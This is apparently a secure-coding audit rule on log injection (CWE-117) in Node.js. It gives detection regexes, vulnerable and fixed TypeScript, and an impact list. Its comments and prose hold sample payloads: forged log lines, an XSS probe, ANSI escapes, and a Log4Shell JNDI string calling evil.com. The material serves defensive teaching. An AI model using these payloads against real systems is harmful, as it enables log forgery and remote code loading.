# OC-077: Log Injection

**Category:** Injection
**Severity:** MEDIUM
**Auditors:** INJ-01, DATA-04
**CWE:** CWE-117
**OWASP:** A09:2021 Security Logging and Monitoring Failures

## Description

Log injection occurs when user-controlled input is written to application logs without sanitization, allowing attackers to inject fake log entries, corrupt log analysis, or exploit log processing pipelines. By injecting newline characters (`\n`), an attacker can create fake log lines that appear to come from the application, making incident response and forensics unreliable.

In Node.js applications using structured logging (Winston, Pino, Bunyan), the risk is lower because user input is placed in JSON fields rather than the log line itself. However, applications using `console.log()` with template literals or string concatenation for logging are vulnerable.

Advanced log injection attacks target log aggregation systems: injecting ANSI escape codes can exploit terminal-rendering vulnerabilities, injecting JNDI lookups (`${jndi:ldap://evil.com}`) targeted Log4j (CVE-2021-44228), and injecting format strings can crash log processors. If logs are displayed in web admin panels without escaping, log injection becomes a stored XSS vector.

## Detection

```
# Logging user input without sanitization
console\.log\(.*req\.(body|query|params|headers)
console\.error\(.*req\.
logger\.(info|warn|error|debug)\(.*req\.
winston\.(info|warn|error)\(`.*\$\{.*req\.
# Template literal logging
console\.log\(`.*\$\{.*user
console\.log\(`.*\$\{.*input
# Format string in log
%s.*req\.(body|query)
```

## Vulnerable Code

```typescript
app.post('/login', (req, res) => {
  const { username } = req.body;
  // VULNERABLE: user input directly in log message
  console.log(`Login attempt for user: ${username}`);
  // Attacker: username = "admin\n[INFO] Login successful for admin"
  // Creates a fake "successful login" log entry

  // Also vulnerable: log injection for XSS in log viewer
  // username = "<script>alert(1)</script>"
  // Or ANSI escape: username = "\x1b[31mCRITICAL\x1b[0m System compromised"

  authenticateUser(username, req.body.password);
});

app.get('/search', (req, res) => {
  const { q } = req.query;
  console.log(`Search query: ${q}`);
  // Attacker: q = "test\n[ERROR] Database connection failed\n[INFO] Failover to backup"
});
```

## Secure Code

```typescript
import pino from 'pino';
const logger = pino();

app.post('/login', (req, res) => {
  const { username } = req.body;
  // SAFE: Structured logging — user input is a JSON field
  logger.info({ username, event: 'login_attempt' }, 'Login attempt');
  // Output: {"level":30,"username":"admin\\nfake","event":"login_attempt","msg":"Login attempt"}
  // Newlines are escaped in JSON serialization

  authenticateUser(username, req.body.password);
});

// SAFE: Sanitize if string logging is required
function sanitizeForLog(input: string): string {
  return input
    .replace(/[\r\n]/g, ' ')           // Remove newlines
    .replace(/[\x00-\x1f\x7f]/g, '')   // Remove control chars
    .substring(0, 200);                  // Limit length
}

app.get('/search', (req, res) => {
  const sanitized = sanitizeForLog(req.query.q);
  console.log(`Search query: ${sanitized}`);
});
```

## Impact

Log forging creating false audit trails. Corrupting SIEM analysis and incident response. Stored XSS in log viewer dashboards. Triggering vulnerabilities in log processing pipelines. Hiding attacker activity by injecting benign-looking log entries.

## References

- CWE-117: Improper Output Neutralization for Logs
- OWASP: Log Injection
- CVE-2021-44228: Log4Shell — JNDI injection via log messages (Java, but illustrative)
- OWASP: Logging Cheat Sheet
